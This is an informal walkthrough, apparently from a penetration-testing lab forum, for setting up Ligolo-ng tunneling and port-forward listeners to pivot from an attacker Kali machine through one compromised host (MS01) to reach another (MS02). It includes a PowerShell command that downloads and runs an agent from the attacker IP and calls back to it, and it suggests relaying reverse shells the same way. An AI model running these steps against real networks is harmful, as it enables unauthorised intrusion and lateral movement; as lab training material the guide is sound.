
```
Ligolo-ng

here's a quick and dirty guide:

on kali:

sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

./proxy -selfcert

./proxy -selfcert -laddr 0.0.0.0:443

on proxy server:

iwr -uri [http://](http://)<kali-ip>/agent.exe -outfile agent.exe

.\agent.exe -connect <kali-ip>:11601 -ignore-cert

Check sessions

session

then press 1 then type start enter and you are done

Check routes

ifconfig

Setting up listeners

listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444

listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80

back to kali:

do ifconfig on ligolo and get the internal IP. also start the tunnel:

tunnel_start

tunnel_list

Initialise the tunnel for tunneling

start

then pop another terminal and: (be sure to type start on proxy ligolo first!)

sudo ip route add <network>/24 dev ligolo

Check for listeners

listener_list

there you go. you're set

Ligolo works easily and does the heavy lift - (sorry for long post, but would be nice so others can see it here, also will pin it)

MS01 has 10.10.123.148 as 2nd IP

Kali IP is 192.168.45.203

MS02 can't reach KALI , so needs to go through MS01 to reach Kali , right?

Mindset : Let's say you want to download a file from your KALI like usual where you opened this ->

python3 -m http.server 80

You have opened server on 192.168.45.203:80 , but MS02 ONLY reaches MS01 , so you need to port forward .

To make thing simple for myself I added a listener that does this port forwarding MS:80 to KALI:80 , looks like this on session 1 (where MS01 is connected)->

listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp

How to reach Kali IP now to download something? On MS02 a command like this -> wget MS01:80 , and will redirect to KALI:80 ..

In your care (just as an example, don't take it blindly copy paste),

powershell wget [http://10.10.123.148:80/test](http://10.10.123.148:80/test)

And that's it ..

SAME goes for let's say a reverse shell .. add a new listener but with port 443 for example , and so on!

IF that is not working either, consider you are ADMIN on the first pivot machine , you can play with that machine to do WATHEVER you need..

```